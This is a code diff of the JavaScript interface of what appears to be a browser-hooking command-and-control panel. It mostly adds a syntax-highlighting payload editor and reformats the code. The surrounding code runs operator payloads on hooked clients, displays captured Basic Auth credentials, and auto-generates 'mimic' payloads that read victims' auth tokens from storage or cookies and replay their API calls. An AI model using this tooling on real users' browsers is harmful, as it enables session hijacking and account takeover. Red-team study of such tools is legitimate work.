@@ -4,19 +4,45 @@ let tokenLocation    = "";
 let tokenKey         = "";
 
 
+// Syntax highlighting code editor
+let codeEditor;
+let codeEditorLoaded = false;
+let codeEditorBig    = false;
+
+function initializeCodeMirror()
+{
+	if (!codeEditorLoaded)
+	{
+		console.log("Instantiating code editor");
+		var textArea = document.getElementById('payload-editor');
+
+		codeEditor = CodeMirror.fromTextArea(textArea,  {
+			value: "",
+			mode:  "javascript",
+			lineNumbers: false,
+			theme: "default"
+		});
+
+		codeEditorLoaded = true;
+
+		codeEditor.refresh();
+	}
+}
+
+
 function escapeHTML(string) 
 {
-    if (string === undefined || string === null) 
-    {
-        return '';
-    }
+	if (string === undefined || string === null) 
+	{
+		return '';
+	}
 
-    return String(string)
-        .replace(/&/g, "&amp;")
-        .replace(/</g, "&lt;")
-        .replace(/>/g, "&gt;")
-        .replace(/"/g, "&quot;")
-        .replace(/'/g, "&#039;");
+	return String(string)
+	.replace(/&/g, "&amp;")
+	.replace(/</g, "&lt;")
+	.replace(/>/g, "&gt;")
+	.replace(/"/g, "&quot;")
+	.replace(/'/g, "&#039;");
 }
 
 
@@ -420,11 +446,11 @@ async function selectPayload(payload)
 
 	var payloadNameInput   = document.getElementById('payloadName');
 	var payloadDescription = document.getElementById('payloadDescription');
-	var payloadCode        = document.getElementById('payload-editor');
+	// var payloadCode        = document.getElementById('payload-editor');
 
 	payloadNameInput.value   = payload.name;
 	payloadDescription.value = description;
-	payloadCode.value        = code;
+	codeEditor.setValue(code);
 }
 
 
@@ -638,7 +664,7 @@ async function refreshSingleClientPayloadList(client, modal)
 		executePayloadButton.id          = id;
 		executePayloadButton.client      = client;
 		executePayloadButton.className   = 'btn btn-sm me-2';
-		executePayloadButton.textContent = 'Run Payload';
+		executePayloadButton.textContent = 'Run';
 		executePayloadButton.setAttribute('data-toggle', 'tooltip');
 		executePayloadButton.setAttribute('title', 'Run Payload on this Client');
 
@@ -653,7 +679,7 @@ async function refreshSingleClientPayloadList(client, modal)
 		var repeatPayloadToggle         = document.createElement('button');
 		repeatPayloadToggle.id          = id;
 		repeatPayloadToggle.className   = 'btn btn-sm me-2';
-		repeatPayloadToggle.textContent = 'Repeat Payload';
+		repeatPayloadToggle.textContent = 'Repeat';
 		repeatPayloadToggle.name        = name;
 		repeatPayloadToggle.client      = client;
 
@@ -745,7 +771,7 @@ async function refreshSavedPayloadList()
 		var executePayloadButton         = document.createElement('button');
 		executePayloadButton.id          = id;
 		executePayloadButton.className   = 'btn btn-sm me-2';
-		executePayloadButton.textContent = 'Run Payload';
+		executePayloadButton.textContent = 'Run';
 		executePayloadButton.setAttribute('data-toggle', 'tooltip');
 		executePayloadButton.setAttribute('title', 'Run Payload on All Clients Once');
 
@@ -759,7 +785,7 @@ async function refreshSavedPayloadList()
 		var repeatPayloadToggle         = document.createElement('button');
 		repeatPayloadToggle.id          = id;
 		repeatPayloadToggle.className   = 'btn btn-sm me-2';
-		repeatPayloadToggle.textContent = 'Repeat Payload';
+		repeatPayloadToggle.textContent = 'Repeat';
 		repeatPayloadToggle.name        = name;
 
 		repeatPayloadToggle.setAttribute('data-toggle', 'tooltip');
@@ -814,15 +840,61 @@ async function refreshSavedPayloadList()
 
 
 
+function toggleCodeEditor()
+{
+	var codeDiv                 = document.getElementById('payload-editor');
+	var editorCol               = document.getElementById('payloadEditor');
+	var listCol                 = document.getElementById('savedPayloadsList');
+	var listGroup               = document.getElementById('savedPayloadsGroup');
+	var payloadNameGroup        = document.getElementById('payloadNameGroup');
+	var payloadDescriptionGroup = document.getElementById('payloadDescriptionGroup');
+	var toggleCodeButton        = document.getElementById('payload-code-button');
+
+	    // Toggle the editor column to full width and back
+	if (editorCol.classList.contains('col-md-12')) 
+	{
+		this.textContent = "Expand Code";
+		editorCol.classList.remove('col-md-12');
+		editorCol.classList.add('col-md-6');
+		listCol.classList.remove('d-none');
+		listGroup.style.display               = "block";
+		payloadNameGroup.style.display        = "block";
+		payloadDescriptionGroup.style.display = "block";
+		codeDiv.style.height='200px';
+		codeEditor.setSize(null, "200px");
+		codeEditor.refresh();
+		codeEditorBig = false;
+	} 
+	else 
+	{
+		this.textContent = "Shrink Code";
+		editorCol.classList.remove('col-md-6');
+		editorCol.classList.add('col-md-12');
+		listCol.classList.add('d-none');
+		listGroup.style.display               = "none";
+		payloadNameGroup.style.display        = "none";
+		payloadDescriptionGroup.style.display = "none";
+		codeDiv.style.height = '500px';
+		codeEditor.setSize(null, "500px");
+		codeEditor.refresh();
+		codeEditorBig = true;
+	}
+
+	toggleCodeButton.blur();
+}
+
+
 async function showCustomPayloadModal(skipClear)
 {
 	var modal = new bootstrap.Modal(document.getElementById('customPayloadModal'));
 
-	var saveButton      = document.getElementById('payload-save-button');
-	var importButton    = document.getElementById('payload-import-button');
-	var exportButton    = document.getElementById('payload-export-button');
-	var clearJobsButton = document.getElementById('payload-clear-button');
-	var closeButton     = document.getElementById('payload-close-button');
+	var modalElement      = document.getElementById('customPayloadModal');
+	var saveButton        = document.getElementById('payload-save-button');
+	var importButton      = document.getElementById('payload-import-button');
+	var exportButton      = document.getElementById('payload-export-button');
+	var clearJobsButton   = document.getElementById('payload-clear-button');
+	var closeButton       = document.getElementById('payload-close-button');
+	var toggleCodeButton  = document.getElementById('payload-code-button');
 
 
 	var payloadNameInput   = document.getElementById('payloadName');
@@ -831,16 +903,31 @@ async function showCustomPayloadModal(skipClear)
 
 	var savedPayloadsList = document.getElementById('savedPayloadsList');
 
-	if (!skipClear)
+	initializeCodeMirror();
+
+	if (codeEditorBig)
 	{
-		payloadNameInput.value   = "";
-		payloadDescription.value = "";
-		payloadCode.value        = "";		
+		// Make sure we start with whole UI visible
+		toggleCodeEditor();
 	}
 
+	if (!skipClear)
+	{
+		console.log("-----CLEARING CODE");
+		payloadNameInput.value   = "";
+		payloadDescription.value = "";
+		codeEditor.setValue("");
+		codeEditor.refresh();
+	}
 
-	// Editor toggle stuff
-	var codeEditor = document.getElementById('payloadEditor');
+	modalElement.addEventListener('shown.bs.modal', function ()
+	{
+	    if (codeEditor) 
+	    {
+	        codeEditor.refresh();
+	    }
+	});
+
 	saveButton.disabled      = false;
 
 
@@ -862,11 +949,17 @@ async function showCustomPayloadModal(skipClear)
 	});
 
 
-	payloadCode.addEventListener('input', function() 
+	codeEditor.on("change", function(cm, change) 
 	{
 		unsavedChanges = true;
 		console.log("Unsaved changes!");
 	});
+
+	// payloadCode.addEventListener('input', function() 
+	// {
+	// 	unsavedChanges = true;
+	// 	console.log("Unsaved changes!");
+	// });
 
 
 	closeButton.onclick = function(event) 
@@ -896,7 +989,7 @@ async function showCustomPayloadModal(skipClear)
 	}
 
 
-		// Handle saving modified notes
+	// Handle saving modified notes
 	saveButton.onclick = function(event) 
 	{
 		console.log("Gotta save payload button..");
@@ -911,42 +1004,69 @@ async function showCustomPayloadModal(skipClear)
 			payloadNameInput.classList.remove('is-invalid');
 			console.log("Payload name is: " + payloadNameInput.value);
 
+
+			unsavedChanges = false;
+
+			// send payload to server
+			fetch('/api/savePayload', {
+				method:"POST",
+				body: JSON.stringify({
+					name: payloadNameInput.value,
+					description: btoa(payloadDescription.value),
+					code: btoa(codeEditor.getValue())
+				}),
+				headers: {
+					"Content-type": "application/json; charset=UTF-8"
+				}
+			})
+			.then(response => {
+				if (!response.ok) {
+					console.log('Save payload server failed.');
+				}
+				return response.text();
+			})
+			.then(text => {
+				refreshSavedPayloadList();
+			});	
+
+
 			// Ok, now make sure we actually have some code...
-			if (payloadCode.value === "")
-			{
-				console.log("Forget the code?");
-				event.preventDefault();
-				payloadCode.classList.add('is-invalid');
-			}
-			else
-			{
-				payloadCode.classList.remove('is-invalid');
-				console.log("Got code: " + payloadCode.value);
+			// if (payloadCode.value === "")
+			// if (codeEditor.getValue() === "")
+			// {
+			// 	console.log("Forget the code?");
+			// 	event.preventDefault();
+			// 	payloadCode.classList.add('is-invalid');
+			// }
+			// else
+			// {
+			// 	payloadCode.classList.remove('is-invalid');
+			// 	console.log("Got code: " + payloadCode.value);
 
-				unsavedChanges = false;
+			// 	unsavedChanges = false;
 
-				// send payload to server
-				fetch('/api/savePayload', {
-					method:"POST",
-					body: JSON.stringify({
-						name: payloadNameInput.value,
-						description: btoa(payloadDescription.value),
-						code: btoa(payloadCode.value)
-					}),
-					headers: {
-						"Content-type": "application/json; charset=UTF-8"
-					}
-				})
-				.then(response => {
-					if (!response.ok) {
-						console.log('Save payload server failed.');
-					}
-					return response.text();
-				})
-				.then(text => {
-					refreshSavedPayloadList();
-				});	
-			}
+			// 	// send payload to server
+			// 	fetch('/api/savePayload', {
+			// 		method:"POST",
+			// 		body: JSON.stringify({
+			// 			name: payloadNameInput.value,
+			// 			description: btoa(payloadDescription.value),
+			// 			code: btoa(payloadCode.value)
+			// 		}),
+			// 		headers: {
+			// 			"Content-type": "application/json; charset=UTF-8"
+			// 		}
+			// 	})
+			// 	.then(response => {
+			// 		if (!response.ok) {
+			// 			console.log('Save payload server failed.');
+			// 		}
+			// 		return response.text();
+			// 	})
+			// 	.then(text => {
+			// 		refreshSavedPayloadList();
+			// 	});	
+			// }
 		}
 		saveButton.blur();
 	}
@@ -971,6 +1091,11 @@ async function showCustomPayloadModal(skipClear)
 
 
 
+	toggleCodeButton.onclick = function(event)
+	{
+		toggleCodeEditor();
+	}	
+
 	var importInput = document.getElementById('importInput');
 	importInput.removeEventListener('change', importPayloads);
 	importInput.addEventListener('change', importPayloads, false);
@@ -988,6 +1113,7 @@ async function showCustomPayloadModal(skipClear)
 	}
 
 	modal.show();
+	codeEditor.refresh();	
 }
 
 
@@ -1317,19 +1443,19 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 
 		switch(tokenLocation)
 		{
-			case 'Local Storage':
+		case 'Local Storage':
 			{
 				payload += `var foundAuthToken = localStorage.getItem('${tokenKey}');\n`;
 			}
 			break;
 
-			case 'Session Storage':
+		case 'Session Storage':
 			{
 				payload += `var foundAuthToken = sessionStorage.getItem('${tokenKey}');\n`;
 			}
 			break;
 
-			case 'Cookies':
+		case 'Cookies':
 			{
 				payload += `var foundAuthToken = getCookie('${tokenKey}');\n`;
 			}
@@ -1348,25 +1474,25 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 
 		for (let key in requestBodyJson)
 		{
-	  		if (requestBodyJson.hasOwnProperty(key)) 
+			if (requestBodyJson.hasOwnProperty(key)) 
 	  		{  // Check if the key is not from the prototype chain
-        		var variableName = key.replace(/-/g, '_');
-        		payload += `	"${key}": var_${variableName},\n`;
-    		}		
-		}
-		payload += "};\n";
+	  			var variableName = key.replace(/-/g, '_');
+	  			payload += `	"${key}": var_${variableName},\n`;
+	  		}		
+	  	}
+	  	payload += "};\n";
 
 
-		payload += `fetch('${apiURL}', {\n`;
-		payload += `	method: '${apiMethod}',\n`;
-		payload += `	credentials: 'same-origin',\n`;
-		payload += '    headers: {\n';
+	  	payload += `fetch('${apiURL}', {\n`;
+	  	payload += `	method: '${apiMethod}',\n`;
+	  	payload += `	credentials: 'same-origin',\n`;
+	  	payload += '    headers: {\n';
 
 		// Pull the headers in:
-		for (let key in apiCallData.headers) 
-		{
-		    if (apiCallData.headers.hasOwnProperty(key)) 
-		    {
+	  	for (let key in apiCallData.headers) 
+	  	{
+	  		if (apiCallData.headers.hasOwnProperty(key)) 
+	  		{
 		        var headerInfo = apiCallData.headers[key]; // Assuming this is already an object with 'header' and 'value'
 
 		        var headerName  = headerInfo.header;
@@ -1379,23 +1505,23 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 		        if (headerName === tokenName.value.trim()) 
 		        {
 		            // this is our dynamic token
-		            console.log('&& found auth header!');
+		        	console.log('&& found auth header!');
 
 		            // Need to check if it uses the Bearer format
-		            if (headerValue.includes('Bearer'))
-		            {
-		            	payload += `        '${headerName}': 'Bearer ' + foundAuthToken,\n`;
+		        	if (headerValue.includes('Bearer'))
+		        	{
+		        		payload += `        '${headerName}': 'Bearer ' + foundAuthToken,\n`;
 
-		            }
-		            else
-		            {		          
-		            	payload += `        '${headerName}': foundAuthToken,\n`;
-		            }
+		        	}
+		        	else
+		        	{		          
+		        		payload += `        '${headerName}': foundAuthToken,\n`;
+		        	}
 		        } 
 		        else 
 		        {
-		            console.log('** handling non-auth header...');
-		            payload += `        '${headerName}': '${headerValue}',\n`;
+		        	console.log('** handling non-auth header...');
+		        	payload += `        '${headerName}': '${headerValue}',\n`;
 		        }
 		    }
 		}
@@ -1418,16 +1544,17 @@ async function showMimicApiModal(eventKey, apiCallDataString, apiType)
 		nextButton.blur();
 		console.log("Payload dump:");
 		console.log(payload);
- 
+
 
     	// Ok, now we need to push this into the C2 system
 		var payloadNameInput   = document.getElementById('payloadName');
 		var payloadDescription = document.getElementById('payloadDescription');
-		var payloadCode        = document.getElementById('payload-editor');
+		//var payloadCode        = document.getElementById('payload-editor');
 
 		payloadNameInput.value   = "Mimic API payload";
 		payloadDescription.value = "Automatically generated custom payload from intercepted API network calls.";
-		payloadCode.value        = payload;
+		//payloadCode.value        = payload;
+		codeEditor.setValue(payload);
 
 		modal.hide();
 		showCustomPayloadModal(true);
@@ -1675,11 +1802,12 @@ async function showMimicFormModal(eventKey, formDataString)
     	// Ok, now we need to push this into the C2 system
 		var payloadNameInput   = document.getElementById('payloadName');
 		var payloadDescription = document.getElementById('payloadDescription');
-		var payloadCode        = document.getElementById('payload-editor');
+		//var payloadCode        = document.getElementById('payload-editor');
 
 		payloadNameInput.value   = "Mimic Form submission payload";
 		payloadDescription.value = "Automatically generated custom payload from form submission.";
-		payloadCode.value        = payload;
+		//payloadCode.value        = payload;
+		codeEditor.setValue(payload);
 
 		modal.hide();
 		showCustomPayloadModal(true);
@@ -1876,17 +2004,17 @@ async function getClientDetails(id)
   		cardText.innerHTML += "<br>";
   		cardText.innerHTML += "Basic Auth: <b>" + xhrApiCallJson.user + ':' + xhrApiCallJson.password + "</b>";
   		cardText.innerHTML += "<br>";
-   		cardText.innerHTML += "<br>";
- 		cardText.innerHTML += "Headers:";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "Headers:";
   		cardText.innerHTML += "<br>";
 
   		xhrApiCallJson.headers.forEach(header => {
-	  		cardText.innerHTML += "<b>" + escapeHTML(header.header) + ":" + escapeHTML(header.value) + "</b>";
+  			cardText.innerHTML += "<b>" + escapeHTML(header.header) + ":" + escapeHTML(header.value) + "</b>";
   			cardText.innerHTML += "<br>";
-    	});
+  		});
 
-   		cardText.innerHTML += "<br>";
- 		cardText.innerHTML += "Response Status: <b>" + xhrApiCallJson.responseStatus + "</b>";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "Response Status: <b>" + xhrApiCallJson.responseStatus + "</b>";
   		cardText.innerHTML += "<br>";
   		cardText.innerHTML += "<br>";
 
@@ -1894,12 +2022,12 @@ async function getClientDetails(id)
   		+ eventKey + ',"XHR")>View API Call</button>';
 
   		jsonDataString = JSON.stringify(xhrApiCallJson).replace(/"/g, '&quot;');
-  	  	cardText.innerHTML += `&nbsp;<button type="button" class="btn btn-primary" onclick="showMimicApiModal('${eventKey}', '${jsonDataString}', 'XHR')">Create Mimic Payload</button>`;
-}
+  		cardText.innerHTML += `&nbsp;<button type="button" class="btn btn-primary" onclick="showMimicApiModal('${eventKey}', '${jsonDataString}', 'XHR')">Create Mimic Payload</button>`;
+  	}
   	break;
 
 
-	case 'FETCHAPICALL':
+  case 'FETCHAPICALL':
   	if (document.getElementById('apiEvents').checked == true)
   	{
   		activeEvent = true;
@@ -1914,19 +2042,19 @@ async function getClientDetails(id)
   		cardText.innerHTML += "<br>";
   		cardText.innerHTML += "Method: <b>" + fetchApiCallJson.method + "</b>";
   		cardText.innerHTML += "<br>";
-    	cardText.innerHTML += "<br>";
-		cardText.innerHTML += "Headers:";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "Headers:";
   		cardText.innerHTML += "<br>";
 
   		fetchApiCallJson.headers.forEach(header => {
-	  		cardText.innerHTML += "<b>" + escapeHTML(header.header) + ":" + escapeHTML(header.value) + "</b>";
+  			cardText.innerHTML += "<b>" + escapeHTML(header.header) + ":" + escapeHTML(header.value) + "</b>";
   			cardText.innerHTML += "<br>";
-    	});
+  		});
 
-   		cardText.innerHTML += "<br>";
- 		cardText.innerHTML += "Response Status: <b>" + fetchApiCallJson.responseStatus + "</b>";
-  	
-		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "Response Status: <b>" + fetchApiCallJson.responseStatus + "</b>";
+
+  		cardText.innerHTML += "<br>";
   		cardText.innerHTML += "<br>";
 
   		cardText.innerHTML += '<br><button type="button" class="btn btn-primary" onclick=showReqRespViewer(' 
@@ -1952,8 +2080,8 @@ async function getClientDetails(id)
 
   		cardTitle.innerHTML = "Network Form Submission";
   		cardText.innerHTML += "URL: <b>" + escapeHTML(formPostJson.url) + "</b>";
-   		cardText.innerHTML += "<br>";
- 		cardText.innerHTML += "Action: <b>" + escapeHTML(atob(formPostJson.action)) + "</b>";
+  		cardText.innerHTML += "<br>";
+  		cardText.innerHTML += "Action: <b>" + escapeHTML(atob(formPostJson.action)) + "</b>";
   		cardText.innerHTML += "<br>";
   		cardText.innerHTML += "Method: <b>" + escapeHTML(formPostJson.method) + "</b>";
   		cardText.innerHTML += "<br>";
@@ -2263,7 +2391,7 @@ async function updateClients()
 
   cardText.innerHTML  = "IP:<b>&nbsp;&nbsp;&nbsp;" + client.ip + "</b>";
 
-		//What to do about client notes?
+	//What to do about client notes?
   if (client.notes.length > 0)
   {
   	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showNoteEditor(event,' + `'` 
